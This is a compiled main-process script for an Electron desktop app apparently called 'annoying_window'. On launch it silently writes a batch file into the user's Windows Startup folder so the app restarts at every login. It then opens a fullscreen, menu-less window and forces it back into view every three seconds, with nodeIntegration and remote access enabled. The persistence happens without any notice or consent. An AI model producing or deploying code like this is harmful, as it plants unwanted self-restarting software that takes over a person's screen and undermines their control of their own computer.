var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __markAsModule = (target) => __defProp(target, "__esModule", { value: true });
var __reExport = (target, module2, copyDefault, desc) => {
  if (module2 && typeof module2 === "object" || typeof module2 === "function") {
    for (let key of __getOwnPropNames(module2))
      if (!__hasOwnProp.call(target, key) && (copyDefault || key !== "default"))
        __defProp(target, key, { get: () => module2[key], enumerable: !(desc = __getOwnPropDesc(module2, key)) || desc.enumerable });
  }
  return target;
};
var __toESM = (module2, isNodeMode) => {
  return __reExport(__markAsModule(__defProp(module2 != null ? __create(__getProtoOf(module2)) : {}, "default", !isNodeMode && module2 && module2.__esModule ? { get: () => module2.default, enumerable: true } : { value: module2, enumerable: true })), module2);
};
var import_electron = require("electron");
var import_node_fs = require("node:fs");
var import_main = require("@electron/remote/main");
var path = __toESM(require("node:path"));
(0, import_main.initialize)();
if (require("electron-squirrel-startup")) {
  import_electron.app.quit();
}
(0, import_node_fs.writeFileSync)(path.join(__dirname, "path.js"), `exports.startupPath = "${import_electron.app.getPath("appData")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\maybe-something.bat"`.replace(/\\/g, "\\\\"));
const createWindow = () => {
  const mainWindow = new import_electron.BrowserWindow({
    height: 600,
    width: 800,
    webPreferences: {
      contextIsolation: true,
      nodeIntegration: true,
      preload: path.join(__dirname, "preload.js")
    }
  });
  mainWindow.loadFile(path.join(__dirname, "../src/index.html"));
  mainWindow.setFullScreen(true);
  mainWindow.removeMenu();
  (0, import_node_fs.writeFileSync)(`${import_electron.app.getPath("appData")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\maybe-something.bat`, '"%localappdata%\\annoying_window\\annoying-window.exe"');
  setInterval(() => {
    mainWindow.show();
  }, 3e3);
  (0, import_main.enable)(mainWindow.webContents);
};
import_electron.app.on("ready", createWindow);
import_electron.app.on("window-all-closed", () => {
  if (process.platform !== "darwin") {
    import_electron.app.quit();
  }
});
import_electron.app.on("activate", () => {
  if (import_electron.BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});
